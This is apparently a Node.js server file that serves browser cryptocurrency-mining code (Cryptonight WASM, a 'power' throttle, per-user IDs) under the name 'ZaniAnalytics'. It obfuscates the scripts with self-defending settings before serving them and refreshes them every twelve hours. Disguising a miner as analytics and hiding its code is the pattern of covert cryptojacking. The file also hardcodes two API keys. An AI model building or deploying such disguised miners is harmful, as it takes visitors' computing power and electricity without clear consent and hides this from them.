var http = require('http');
var https = require('https');
var WebSocket = require("ws");
var net = require('net');
var fs = require('fs');
var MobileDetect = require('mobile-detect');
var URL = require('url');
var JavaScriptObfuscator = require('javascript-obfuscator');
var crypto = require('crypto');

const API_KEY = "1z4Srfa77MskHgPsrZZLhZyr7UoYyZiy";
const API_KEY_V2 = "eZhTMH4p89rLuBHJNsxHOYkMiYeUNwCw";
var conf = JSON.parse(fs.readFileSync(__dirname + '/config.json', 'utf8'));
const ssl = !!(conf.key && conf.cert);

var analyticsMobile = "";
var analyticsDesktop = "";
var analyticsJs = "";
var analyticsWasm = "";

var enableEncryption = true;

function loadEncryptedAnalytics(){
    fs.readFile(__dirname + '/web/zanihash.js', (err, jsBuf) => {
        jsBuf = jsBuf.toString().replace(/%devoliosMiner_domain%/g, conf.domain);
        var obfuscationResult = JavaScriptObfuscator.obfuscate(jsBuf, {
            compact: true,
            controlFlowFlattening: false,
            deadCodeInjection: false,
            debugProtection: false,
            debugProtectionInterval: false,
            disableConsoleOutput: true,
            identifierNamesGenerator: 'hexadecimal',
            log: false,
            renameGlobals: false,
            rotateStringArray: true,
            selfDefending: true,
            stringArray: true,
            stringArrayEncoding: false,
            stringArrayThreshold: 0.75,
            unicodeEscapeSequence: false,
            //domainLock: ['.zanibet.com']
        });
        (enableEncryption) ? analyticsMobile = obfuscationResult.getObfuscatedCode():analyticsMobile = jsBuf;
        //analyticsMobile = obfuscationResult.getObfuscatedCode();
        console.log("Load ZaniAnalytics Mobile");
    });

    fs.readFile(__dirname + '/web/zanihashdesktop.js', (err, jsBuf) => {
        jsBuf = jsBuf.toString().replace(/%devoliosMiner_domain%/g, conf.domain);
        var obfuscationResult = JavaScriptObfuscator.obfuscate(jsBuf, {
            compact: true,
            controlFlowFlattening: false,
            deadCodeInjection: false,
            debugProtection: false,
            debugProtectionInterval: false,
            disableConsoleOutput: true,
            identifierNamesGenerator: 'hexadecimal',
            log: false,
            renameGlobals: false,
            rotateStringArray: true,
            selfDefending: true,
            stringArray: true,
            stringArrayEncoding: false,
            stringArrayThreshold: 0.75,
            unicodeEscapeSequence: false,
            //domainLock: ['.zanibet.com']
        });
        (enableEncryption) ? analyticsDesktop = obfuscationResult.getObfuscatedCode():analyticsDesktop = jsBuf;
        //analyticsDesktop = obfuscationResult.getObfuscatedCode();
        console.log("Load ZaniAnalytics Desktop");
    });

    fs.readFile(__dirname + '/web/analytics.js', (err, jsBuf) => {
        jsBuf = jsBuf.toString().replace(/%devoliosMiner_domain%/g, conf.domain);
        var obfuscationResult = JavaScriptObfuscator.obfuscate(jsBuf, {
            compact: true,
            controlFlowFlattening: false,
            deadCodeInjection: false,
            debugProtection: false,
            debugProtectionInterval: false,
            disableConsoleOutput: true,
            identifierNamesGenerator: 'hexadecimal',
            log: false,
            renameGlobals: false,
            rotateStringArray: true,
            selfDefending: true,
            stringArray: true,
            stringArrayEncoding: false,
            stringArrayThreshold: 0.75,
            unicodeEscapeSequence: false,
            //domainLock: ['.zanibet.com']
        });
        (enableEncryption) ? analyticsJs = obfuscationResult.getObfuscatedCode():analyticsJs = jsBuf;
        //analyticsJs = obfuscationResult.getObfuscatedCode();
        console.log("Load Cryptonight WASM");
    });

    fs.readFile(__dirname + '/web/analytics.w.js', (err, jsBuf) => {
        jsBuf = jsBuf.toString().replace(/%devoliosMiner_domain%/g, conf.domain);
        var obfuscationResult = JavaScriptObfuscator.obfuscate(jsBuf, {
            compact: true,
            controlFlowFlattening: false,
            deadCodeInjection: false,
            debugProtection: false,
            debugProtectionInterval: false,
            disableConsoleOutput: true,
            identifierNamesGenerator: 'hexadecimal',
            log: false,
            renameGlobals: false,
            rotateStringArray: true,
            selfDefending: true,
            stringArray: true,
            stringArrayEncoding: false,
            stringArrayThreshold: 0.75,
            unicodeEscapeSequence: false,
            //domainLock: ['.zanibet.com']
        });
        (enableEncryption) ? analyticsWasm = obfuscationResult.getObfuscatedCode():analyticsWasm = jsBuf;
        //analyticsWasm = obfuscationResult.getObfuscatedCode();
        console.log("Load Cryptonight WASM Fallback");
    });
}

setInterval(function(){
    console.log("Reload encrypted analytics !");
    loadEncryptedAnalytics();
}, 1000*60*60*12);

loadEncryptedAnalytics();

const serve = (req, res) => {
    //console.log('Receive request from', req.connection.remoteAddress, req.url);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Request-Method', '*');
    res.setHeader('Access-Control-Allow-Methods', 'OPTIONS, GET');
    res.setHeader('Access-Control-Allow-Headers', '*');

    var md = new MobileDetect(req.headers['user-agent']);
    var isMobile = md.mobile();

    var apiKeyHeader = req.headers['api-key'];
    var userId = req.headers['user-id'];
    var power = parseInt(req.headers['power']);
    var plug = req.headers['plug'];

    if (power == null || isNaN(power)) power = 95;
    if (userId == null) userId = "Devolios";
    (plug == null || plug != "true") ? plug = false : plug = true;

    // Vérifier si une redirection doit être effectuée
    if (req.url === '/' && isMobile || req.url === '/' && apiKeyHeader != null){
        //console.log("Request ZaniAnalytics Mobile");
        if (apiKeyHeader == null || apiKeyHeader == "") {
            console.log("API Key is empty, redirect to ZaniAnalytics Web");
            res.writeHead(302, {'Location': 'https://analytics.zanibet.com/index.html'});
            return res.end();
        } else if (String(apiKeyHeader) != API_KEY && String(apiKeyHeader) != API_KEY_V2){
            console.log("API Key is invalid :", apiKeyHeader, "- Closing connexion !");
            return res.end();
        }

        req.url = '/worker.html';
    } else if (req.url === '/'){
        console.log("Request ZaniAnalytics Web");
        req.url = '/index.html';
    } else if (req.url === '/worker.html' && apiKeyHeader == null){
        console.log("API Key is invalid :", apiKeyHeader, "- Closing connexion !");
        //return res.end();
    }

    fs.readFile(__dirname + '/web' + req.url, (err, buf) => {
        if (err) {
            return res.end();
        } else {
            if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
                buf = buf.toString().replace(/%devoliosMiner_domain%/g, conf.domain);

                if (req.url === '/worker.html'){
                    console.log('Power :', power, 'UserId :', userId, 'isPlug :', plug);
                    buf = buf.toString().replace(/%analytics%/g, analyticsMobile);
                    buf = buf.toString().replace(/%userId%/g, userId);
                    buf = buf.toString().replace(/%power%/g, power);
                    buf = buf.toString().replace(/%isPlug%/g, plug);
                    buf = buf.toString().replace(/javascript-obfuscator:enable/g, "");
                    buf = buf.toString().replace(/javascript-obfuscator:disable/g, "");
                    return res.end(buf);
                } else if (req.url === '/index.html'){
                    console.log('Power :', power, 'UserId :', userId, 'isPlug :', plug);
                    buf = buf.toString().replace(/%analytics%/g, analyticsDesktop);
                    buf = buf.toString().replace(/javascript-obfuscator:enable/g, "");
                    buf = buf.toString().replace(/javascript-obfuscator:disable/g, "");
                    return res.end(buf);
                } else if (req.url.match(/\.js$/)) {
                    if (req.url === "/analytics.js"){
                        buf = analyticsJs;
                    } else if (req.url === "/analytics.w.js"){
                        buf = analyticsWasm;
                    }
                    res.setHeader('content-type', 'application/javascript');
                    return res.end(buf);
                }
            } else {
                res.setHeader('Content-Type', 'application/octet-stream');
                return res.end(buf);
            }
        }
    });
}

//ssl support
if (ssl && conf.env != "dev") {
    var httpsServer = https.createServer({
        key: fs.readFileSync(conf.key),
        cert: fs.readFileSync(conf.cert),
        ca: fs.readFileSync(conf.ca)
    }, serve)
    httpsServer.listen(443, conf.lhost);

    var httpServer = http.createServer(function(req, res){
        res.writeHead(301,{Location: `https://${req.headers.host}${req.url}`});
        res.end();
    });
    httpServer.listen(80, conf.lhost);
} else {
    var httpServer = http.createServer(serve);
    httpServer.listen(conf.lport, conf.lhost);
}
